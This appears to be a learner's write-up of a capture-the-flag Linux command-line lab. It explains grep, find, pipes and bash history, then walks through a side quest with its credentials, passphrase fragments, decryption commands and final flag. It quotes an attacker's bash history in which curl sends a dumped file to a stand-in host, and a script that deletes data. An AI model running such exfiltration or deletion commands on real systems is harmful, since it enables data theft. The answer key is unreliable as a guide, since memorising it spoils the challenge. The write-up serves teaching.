
```
mcskidy@tbfc-web01:~/Guides$ ls -la drwxrwxr-x 2 mcskidy mcskidy 4096 Oct 13 01:26 .  
drwxr-x--- 19 mcskidy mcskidy 4096 Oct 23 12:29 ..  
-rw-rw-r-- 1 mcskidy mcskidy 504 Oct 13 01:26 .guide.txt
```

## Log files

`/var/log/`, a Linux directory where all security events (logs) are stored.

- RunÂ `grep "Failed password" auth.log`Â to look for the failed logins inside theÂ `auth.log`.

Grepping Logfiles

```shell-session
mcskidy@tbfc-web01:~$ cd /var/log
mcskidy@tbfc-web01:~$ grep "Failed password" auth.log
2025-10-13T01:43:48 tbfc-web01: Failed password for socmas from eggbox-196.hopsec.thm
[...]
```

## Finding the Files

- RunÂ `find /home/socmas -name *egg*`Â to search for "eggs" in the socmas home directory.
- Note thatÂ `find`Â is a powerful command. Check out itsÂ [documentation](https://man7.org/linux/man-pages/man1/find.1.html)Â for more details.

Using Find Command

```shell-session
mcskidy@tbfc-web01:~$ find /home/socmas -name *egg*
/home/socmas/2025/eggstrike.sh
```

## Analyzing the Eggstrike

Files with theÂ `.sh`Â extension containÂ CLIÂ commands and are called shell scripts. Such scripts are used both by IT teams to automate things and by attackers to quickly run malicious commands.

Eggstrike Content

```shell-session
mcskidy@tbfc-web01:~$ cd /home/socmas/2025
mcskidy@tbfc-web01:~$ cat eggstrike.sh
# Eggstrike v0.3
# Â© 2025, Sir Carrotbane, HopSec
cat wishlist.txt | sort | uniq > /tmp/dump.txt
rm wishlist.txt && echo "Chistmas is fading..."
mv eastmas.txt wishlist.txt && echo "EASTMAS is invading!"
```

1. The lines starting withÂ `#`Â are just comments and are not the actual commands.
2. TheÂ `cat wishlist.txt | sort | uniq`Â lists unique items from the wishlist.txt.
3. The command then sends the output (unique orders) to theÂ `/tmp/dump.txt`Â file.
4. TheÂ `rm wishlist.txt`Â deletes the wishlist file (containing Christmas wishes).
5. TheÂ `mv eastmas.txt wishlist.txt`Â replaces the original file with eastmas.txt.

## CLIÂ Features

|Special Symbol|Description|Example|
|---|---|---|
|Pipe symbol (`\|`)|Send the output from the first command to the second|`cat unordered-list.txt \| sort \| uniq`|
|Output redirect (`>`/`>>`)|UseÂ `>`Â to overwrite a file, andÂ `>>`Â to append to the end|`some-long-command > /home/mcskidy/output.txt`|
|Double ampersand (`&&`)|Run the second command if the first was successful|`grep "secret" message.txt && echo "Secret found!"`|

## Bash History

Did you know that every command you run is saved in a hidden history file, also called Bash history? It is located at every user's home directory:Â `/home/mcskidy/.bash_history`Â for McSkidy, andÂ `/root/.bash_history`Â for root, and you can check it with a convenientÂ `history`Â command, or just read the files directly withÂ `cat`. Let's check if Sir Carrotbane with his bad bunnies left their traces in history!

- Familiarize yourself with Bash history by running theÂ `history`Â command.
- Note that your commands are also saved to a file (`cat .bash_history`).

Accessing Bash History

```shell-session
root@tbfc-web01:/home/mcskidy$ cd /root
root@tbfc-web01:~$ cat .bash_history
curl --data "@/tmp/dump.txt" http://files.hopsec.thm/upload
curl --data "%qur\(tq_` :D AH?65P" http://red.hopsec.thm/report
[...]
```

## Side quest

# ðŸ§  **SideQuest Full Walkthrough (Commands Only + Logic)**

---

## **0ï¸âƒ£ Log in to the machine**

Credentials given in challenge:

`ssh eddi_knapp@MACHINE_IP # password: S0mething1Sc0ming`

---

## **1ï¸âƒ£ Enumerate home directory**

Looking for unusual or hidden content:

`ls -aR ~`

Noticed interesting folders:

- `.secret`
    
- `.secret_git`
    
- `.bashrc`
    
- hidden images under `~/Pictures`
    

---

# **ðŸ” PASSFRAG Clues**

## **Clue 1**

> "I ride with your session, not with your chest of files.  
> Open the little bag your shell carries when you arrive."

That means: `.bashrc`

`cat ~/.bashrc`

Found:

`PASSFRAG1="3ast3r"`

---

## **Clue 2**

> "The tree shows today; the rings remember yesterday.  
> Read the ledgerâ€™s older pages."

Means: git history (a ledger of past changes).

Go to `.secret_git` and view git log:

`cd ~/.secret_git git log`

Output showed two commits â†’ look at older commit:

`git show d12875c8b62e089320880b9b7e41d6765818af3d`

Found:

`PASSFRAG2: -1s-`

---

## **Clue 3**

> "When pixels sleep, their tails sometimes whisper plain words.  
> Listen to the tail."

Pixels â†’ images  
Tail â†’ read last lines of file  
Hidden images â†’ check hidden inside pictures folder

`ls -a ~/Pictures`

Found:

`.easter_egg`

Read its tail:

`tail ~/Pictures/.easter_egg`

Found:

`PASSFRAG3: c0M1nG`

---

## **Combine fragments**

`3ast3r-1s-c0M1nG`

---

# ðŸ” **Decrypt McSkidy GPG note**

`gpg --pinentry-mode=loopback --decrypt /home/eddi_knapp/Documents/mcskidy_note.txt.gpg`

Paste passphrase when prompted:

`3ast3r-1s-c0M1nG`

UNLOCK_KEY: 91J6X7R4FQ9TQPM9JX2Q9X2Z

# ðŸ§¾ Get ciphertext from the website

Open GUI Firefox on VM:

`firefox`

U2FsdGVkX1/7xkS74RBSFMhpR9Pv0PZrzOVsIzd38sUGzGsDJOB9FbybAWod5HMsa+WIr5HDprvK6aFNYuOGoZ60qI7axX5Qnn1E6D+BPknRgktrZTbMqfJ7wnwCExyU8ek1RxohYBehaDyUWxSNAkARJtjVJEAOA1kEOUOah11iaPGKxrKRV0kVQKpEVnuZMbf0gv1ih421QvmGucErFhnuX+xv63drOTkYy15s9BVCUfKmjMLniusI0tqs236zv4LGbgrcOfgir+P+gWHc2TVW4CYszVXlAZUg07JlLLx1jkF85TIMjQ3B91MQS+btaH2WGWFyakmqYltz6jB5DOSCA6AMQYsqLlx53ORLxy3FfJhZTl9iwlrgEZjJZjDoXBBMdlMCOjKUZfTbt3pnlHWEaGJD7NoTgywFsIw5cz7hkmAMxAIkNn/5hGd/S7mwVp9h6GmBUYDsgHWpRxvnjh0s5kVD8TYjLzVnvaNFS4FXrQCiVIcp1ETqicXRjE4T0MYdnFD8h7og3ZlAFixM3nYpUYgKnqi2o2zJg7fEZ8c=

Copy ciphertext â†’ save to file:

`cat > /tmp/website_output.txt # paste ciphertext CTRL + D`

---

# ðŸ”“ Decrypt ciphertext with OpenSSL

`openssl enc -d -aes-256-cbc -pbkdf2 -iter 200000 -salt -base64 \ -in /tmp/website_output.txt \ -out /tmp/decoded_message.txt \ -pass pass:'91J6X7R4FQ9TQPM9JX2Q9X2Z'`

Show output (contains THM flag):

`cat /tmp/decoded_message.txt`

THM{w3lcome_2_A0c_2025}

